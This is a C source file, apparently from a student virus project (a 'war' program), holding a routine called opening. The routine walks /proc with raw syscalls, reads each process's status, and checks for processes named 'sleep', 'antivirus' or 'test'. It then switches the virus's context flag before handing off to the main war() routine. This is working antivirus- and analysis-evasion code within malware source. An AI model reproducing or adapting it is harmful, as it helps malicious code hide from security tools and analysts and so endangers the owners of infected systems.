/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   opening.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/27 12:20:54 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/27 12:21:07 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

__INLINE__ bool	check_name(char *str, int len)
{
	if (!str)
		return (false);
	for (register int i = 0 ; i < len ; i++)
	{
		if (str[i] < '0' || str[i] > '9')
			return (false);
	}
	return (true);
}

void	opening(t_data *data)
{
	int				fd[3];
	int				limit;
	char			buf[BUFF_SIZE] = {0};
	char			target[9] = "/status";
	char			path[PATH_MAX] = "/proc/";
	char			prog[PROG_INFO] = {0};
	char			needle[PROG_ENTRY][16] = { "sleep", "antivirus", "test" };
	linux_dirent64	*curr = NULL;

	char de[] = "opening\n";
	_write(1, de, _strlen(de));

	data->context = false;
	if ((fd[0] = _open(path, O_RDONLY, 0000)) < 0)
		goto ERR;

	while ((limit = _getdents64(fd[0], (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		for (register int i = 0 ; i < limit ; i += curr->d_reclen)
		{
			curr = (struct linux_dirent64 *)(buf + i);

			int len = _strlen(curr->d_name);
			if (check_name(curr->d_name, len) == true)
			{
				_memcpy(path + 6, curr->d_name, len);
				path[6 + len] = '\0';
				if ((fd[1] = _open(path, O_RDONLY, 0000)) < 0)
				{
					_close(fd[0]);
					goto ERR;
				}

				_memcpy(path + (6 + len), target, 9);
				if ((fd[2] = _open(path, O_RDONLY, 0000)) < 0)
				{
					_close(fd[1]);
					goto ERR;
				}

				if (_read(fd[2], prog, PROG_INFO) > 0)
				{
					for (register int j = 0 ; j < PROG_ENTRY ; j++)
					{
						int k = 6;
						while ((prog[k] == ' ' || prog[k] == '\t') && prog[k] != '\0')
							k++;
						if (_strncmp(needle[j], &prog[k], _strlen(needle[j])) == 0)
						{
							_close(fd[2]);
							_close(fd[1]);
							data->context = false;
							goto ERR;
						}
					}
				}
				_close(fd[2]);
				_close(fd[1]);
			}
		}
	}
	_close(fd[0]);
	data->context = true;

ERR:
	war(data);
}
